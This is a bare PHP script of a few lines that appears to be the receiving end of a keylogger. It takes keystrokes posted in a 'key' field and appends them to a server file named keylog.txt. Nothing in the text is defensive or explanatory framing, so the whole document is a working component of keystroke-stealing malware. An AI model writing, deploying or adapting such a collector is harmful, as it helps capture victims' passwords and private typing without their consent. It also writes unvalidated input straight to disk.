<?php
if ($_POST['key']) {
    $file = fopen('keylog.txt', 'a');
    fwrite($file, $_POST['key']);
    fclose($file);
}
?>
